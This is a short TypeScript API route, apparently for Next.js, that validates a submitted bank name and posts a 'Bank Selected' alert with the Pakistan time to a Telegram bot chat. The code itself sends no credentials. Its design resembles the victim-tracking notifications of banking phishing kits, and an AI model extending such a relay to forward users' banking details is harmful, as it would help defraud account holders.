import { NextResponse } from 'next/server'

// Escape the small set of characters that break Telegram HTML parse mode.
function escapeHtml(value: string) {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

// Format the current time in Pakistan Standard Time, e.g. "09-Aug-2026, 1:09 pm".
function formatPakistanTime() {
  const now = new Date()
  const parts = new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Asia/Karachi',
    day: '2-digit',
    month: 'short',
    year: 'numeric',
    hour: 'numeric',
    minute: '2-digit',
    hour12: true,
  }).formatToParts(now)

  const get = (type: string) => parts.find((p) => p.type === type)?.value ?? ''
  const day = get('day')
  const month = get('month')
  const year = get('year')
  const hour = get('hour')
  const minute = get('minute')
  const period = get('dayPeriod').toLowerCase()

  return `${day}-${month}-${year}, ${hour}:${minute} ${period}`
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const bankName = typeof body?.bankName === 'string' ? body.bankName.trim() : ''

    if (!bankName || bankName.length > 120) {
      return NextResponse.json({ error: 'Invalid bank name' }, { status: 400 })
    }

    const token = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!token || !chatId) {
      return NextResponse.json({ error: 'Telegram is not configured' }, { status: 503 })
    }

    const safeName = escapeHtml(bankName)
    const time = formatPakistanTime()
    const text =
      `🏦 <b>${safeName}</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🏦 Bank Selected\n\n` +
      `• <b>Time (PKT):</b> ${time}`

    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      }),
      cache: 'no-store',
    })

    if (!telegramResponse.ok) {
      return NextResponse.json({ error: 'Telegram notification failed' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ error: 'Invalid request' }, { status: 400 })
  }
}
